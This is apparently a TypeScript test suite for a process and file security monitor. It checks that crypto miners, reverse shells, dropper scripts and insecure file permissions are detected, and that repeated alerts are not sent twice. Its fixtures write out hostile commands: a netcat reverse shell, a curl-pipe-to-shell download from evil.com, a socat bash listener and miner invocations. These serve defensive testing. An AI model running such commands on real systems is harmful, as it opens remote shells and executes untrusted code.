import test from 'node:test';
import assert from 'node:assert/strict';
import {
  inspectProcesses,
  inspectFiles,
  SystemSecurityMonitor,
  type ProcessInfo,
  type FileInspectionTarget,
} from '../src/security/system-monitor.js';

test('monitor de processos detecta mineradores de criptomoeda conhecidos', () => {
  const processes: ProcessInfo[] = [
    { pid: 101, user: 'velton', cpu: 0.1, mem: 1.2, name: 'node', cmd: 'node dist/src/server/server.js' },
    { pid: 554, user: 'nobody', cpu: 98.5, mem: 5.0, name: 'xmrig', cmd: './xmrig -o pool.supportxmr.com:3333 -u wallet' },
  ];

  const threats = inspectProcesses(processes);
  assert.equal(threats.length, 1);
  assert.equal(threats[0].type, 'process');
  assert.equal(threats[0].severity, 'critical');
  assert.match(threats[0].title, /minerador/i);
  assert.equal(threats[0].target, 'PID 554 (xmrig)');
});

test('monitor de processos detecta tentativas de shell reverso e payloads suspeitos', () => {
  const processes: ProcessInfo[] = [
    { pid: 888, user: 'www-data', cpu: 0.0, mem: 0.1, name: 'nc', cmd: 'nc -e /bin/sh 198.51.100.1 4444' },
    { pid: 999, user: 'root', cpu: 1.0, mem: 0.2, name: 'kinsing', cmd: '/tmp/kinsing' },
  ];

  const threats = inspectProcesses(processes);
  assert.equal(threats.length, 2);
  assert.ok(threats.some(t => t.title.includes('Shell reverso') || t.description.includes('nc -e')));
  assert.ok(threats.some(t => t.title.includes('Malware') || t.target.includes('kinsing')));
});

test('processos normais do sistema não geram falsos positivos', () => {
  const processes: ProcessInfo[] = [
    { pid: 1, user: 'root', cpu: 0.0, mem: 0.1, name: 'systemd', cmd: '/sbin/init' },
    { pid: 1200, user: 'velton', cpu: 2.5, mem: 3.0, name: 'code', cmd: '/usr/share/code/code' },
    { pid: 1400, user: 'velton', cpu: 1.2, mem: 4.1, name: 'chrome', cmd: '/opt/google/chrome/chrome' },
    { pid: 1800, user: 'velton', cpu: 0.8, mem: 1.5, name: 'node', cmd: 'node scripts/test-features.cjs' },
    { pid: 2100, user: 'root', cpu: 0.0, mem: 0.2, name: 'sshd', cmd: 'sshd: /usr/sbin/sshd -D' },
  ];

  const threats = inspectProcesses(processes);
  assert.equal(threats.length, 0);
});

test('monitor de arquivos detecta scripts maliciosos e permissões perigosas', () => {
  const files: FileInspectionTarget[] = [
    { path: '/tmp/dropper.sh', exists: true, isExecutable: true, content: '#!/bin/sh\ncurl -s http://evil.com/x.sh | sh', mode: 0o777 },
    { path: '/home/velton/JASPER/.env', exists: true, isExecutable: false, content: 'GEMINI_API_KEY=falso-teste', mode: 0o666 }, // world-writable
    { path: '/tmp/clean.txt', exists: true, isExecutable: false, content: 'anotações normais', mode: 0o644 },
  ];

  const threats = inspectFiles(files);
  assert.ok(threats.length >= 2);
  assert.ok(threats.some(t => t.type === 'file' && t.target === '/tmp/dropper.sh'));
  assert.ok(threats.some(t => t.type === 'permission' && t.target === '/home/velton/JASPER/.env'));
});

test('SystemSecurityMonitor executa auditoria completa e deduplica alertas emitidos', async () => {
  let alertCount = 0;
  const monitor = new SystemSecurityMonitor({
    intervalMs: 1000,
    processProvider: async () => [
      { pid: 777, user: 'baduser', cpu: 99.0, mem: 8.0, name: 'cpuminer', cmd: './cpuminer -a cryptonight' },
    ],
    fileProvider: async () => [
      { path: '/tmp/test-miner.sh', exists: true, isExecutable: true, content: 'stratum+tcp://pool.mine.org', mode: 0o755 },
    ],
    onAlert: () => { alertCount++; },
  });

  const report1 = await monitor.runAudit();
  assert.equal(report1.status, 'threat_detected');
  assert.equal(report1.threatsCount, 2);
  assert.equal(alertCount, 2, 'primeira auditoria deve disparar alerta para cada ameaça nova');

  // Segunda auditoria com os mesmos processos e arquivos não deve duplicar os alertas
  const report2 = await monitor.runAudit();
  assert.equal(report2.threatsCount, 2);
  assert.equal(alertCount, 2, 'ameaças já notificadas não devem gerar spam');

  // Adicionando uma nova ameaça
  monitor.setProcessProvider(async () => [
    { pid: 777, user: 'baduser', cpu: 99.0, mem: 8.0, name: 'cpuminer', cmd: './cpuminer -a cryptonight' },
    { pid: 999, user: 'baduser', cpu: 0.1, mem: 0.1, name: 'socat', cmd: 'socat exec:/bin/bash tcp-listen:4444' },
  ]);

  const report3 = await monitor.runAudit();
  assert.equal(report3.threatsCount, 3);
  assert.equal(alertCount, 3, 'nova ameaça deve gerar um novo alerta');
});

test('ferramenta verificar_seguranca_sistema e rota direta do IntentRouter funcionam', async () => {
  const { verificarSegurancaSistema } = await import('../src/tools/system-security.js');
  const res = await verificarSegurancaSistema(false);
  assert.equal(res.success, true);
  assert.ok(['secure', 'warning', 'threat_detected'].includes(res.status));
  assert.ok(typeof res.message === 'string' && res.message.length > 0);

  const { intentRouter } = await import('../src/agent/router.js');
  const route = await intentRouter.route('como está a segurança do sistema?');
  assert.equal(route.handledDirectly, true);
  assert.equal(route.intentName, 'CHECK_SYSTEM_SECURITY');
  assert.ok(route.responseSpeech && route.responseSpeech.includes('sistema'));
});

